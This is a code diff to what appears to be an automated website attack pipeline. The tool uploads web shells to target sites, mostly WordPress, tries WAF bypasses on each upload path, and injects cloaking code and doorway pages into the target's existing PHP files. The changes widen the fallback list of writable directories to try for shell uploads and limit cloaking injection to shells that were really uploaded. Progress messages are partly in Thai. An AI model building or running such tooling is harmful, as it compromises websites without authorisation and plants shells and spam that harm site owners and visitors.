@@ -418,7 +418,15 @@ async function uploadShellWithAllMethods(
   });
 
   try {
-    const uploadPaths = vulnScan?.writablePaths.map(w => w.path) || prescreen?.writablePaths || ["/wp-content/uploads/", "/uploads/", "/images/", "/tmp/"];
+    // Comprehensive fallback paths when vuln scan finds no writable paths
+    const scanPaths = vulnScan?.writablePaths?.length ? vulnScan.writablePaths.map(w => w.path) : null;
+    const prescreenPaths = prescreen?.writablePaths?.length ? prescreen.writablePaths : null;
+    const uploadPaths = scanPaths || prescreenPaths || [
+      "/wp-content/uploads/", "/uploads/", "/images/", "/tmp/",
+      "/wp-content/themes/", "/wp-content/plugins/", "/wp-includes/",
+      "/media/", "/assets/", "/cache/", "/files/",
+      "/public/uploads/", "/content/images/", "/data/", "/backup/",
+    ];
     const parallelConfig: ParallelUploadConfig = {
       targetUrl,
       fileContent,
@@ -472,7 +480,14 @@ async function uploadShellWithAllMethods(
   });
 
   try {
-    const uploadPaths = vulnScan?.writablePaths.map(w => w.path) || prescreen?.writablePaths || ["/wp-content/uploads/", "/uploads/", "/images/"];
+    // Comprehensive fallback paths for smart retry
+    const scanPaths2 = vulnScan?.writablePaths?.length ? vulnScan.writablePaths.map(w => w.path) : null;
+    const prescreenPaths2 = prescreen?.writablePaths?.length ? prescreen.writablePaths : null;
+    const uploadPaths = scanPaths2 || prescreenPaths2 || [
+      "/wp-content/uploads/", "/uploads/", "/images/",
+      "/wp-content/themes/", "/tmp/", "/media/",
+      "/assets/", "/cache/", "/files/",
+    ];
     const retryConfig: ParallelUploadConfig = {
       targetUrl,
       fileContent,
@@ -964,7 +979,12 @@ export async function runUnifiedAttackPipeline(
           progress: 82,
         });
 
-        const uploadPaths = vulnScan?.writablePaths.map(w => w.path) || prescreen?.writablePaths || ["/wp-content/uploads/", "/uploads/", "/images/"];
+        const wafScanPaths = vulnScan?.writablePaths?.length ? vulnScan.writablePaths.map(w => w.path) : null;
+        const wafPrescreenPaths = prescreen?.writablePaths?.length ? prescreen.writablePaths : null;
+        const uploadPaths = wafScanPaths || wafPrescreenPaths || [
+          "/wp-content/uploads/", "/uploads/", "/images/",
+          "/wp-content/themes/", "/tmp/", "/media/",
+        ];
 
         // Run WAF bypass for each upload path
         const wafPromises = uploadPaths.map(path =>
@@ -1398,11 +1418,15 @@ export async function runUnifiedAttackPipeline(
     });
   }
 
-  // ─── Phase 6: Cloaking (ONLY if upload/shellless succeeded) ───
+  // ─── Phase 6: Cloaking (ONLY if real file upload succeeded — not shellless) ───
   let injectionResult: InjectionResult | null = null;
   let cdnUploadResult: CdnUploadResult | null = null;
 
-  if (config.enableCloaking !== false && uploadedFiles.length > 0) {
+  // Only trigger cloaking if we have REAL uploaded files (not shellless results)
+  const realUploadedFiles = uploadedFiles.filter(f => !f.method.startsWith("shellless_"));
+  const hasRealUploads = realUploadedFiles.length > 0;
+
+  if (config.enableCloaking !== false && hasRealUploads) {
     try {
       onEvent({
         phase: "cloaking",
@@ -1479,7 +1503,8 @@ export async function runUnifiedAttackPipeline(
       aiDecisions.push(`Cloaking shell generated: ${cloakingResult.type} (${cloakingResult.internalPages.length} internal pages)`);
 
       // Step 4: Inject cloaking code into existing PHP files on target
-      const activeShellUrl = uploadedFiles.find(f => f.verified)?.url || uploadedFiles[0]?.url;
+      // Use only REAL uploaded files (not shellless) for injection shell URL
+      const activeShellUrl = realUploadedFiles.find(f => f.verified)?.url || realUploadedFiles[0]?.url;
       if (activeShellUrl) {
         onEvent({
           phase: "cloaking",
@@ -1553,11 +1578,12 @@ export async function runUnifiedAttackPipeline(
         progress: 99,
       });
     }
-  } else if (config.enableCloaking !== false && uploadedFiles.length === 0) {
+  } else if (config.enableCloaking !== false && !hasRealUploads) {
+    const shelllessCount = uploadedFiles.filter(f => f.method.startsWith("shellless_")).length;
     onEvent({
       phase: "cloaking",
       step: "skipped",
-      detail: `⏭️ Cloaking ข้าม — ยังไม่มีไฟล์ที่วางสำเร็จ ไม่จำเป็นต้องสร้าง doorway pages`,
+      detail: `⏭️ Cloaking ข้าม — ไม่มีไฟล์ที่วางสำเร็จจริง${shelllessCount > 0 ? ` (มี ${shelllessCount} shellless results แต่ไม่มี active shell สำหรับ inject)` : ""}`,
       progress: 99,
     });
   }
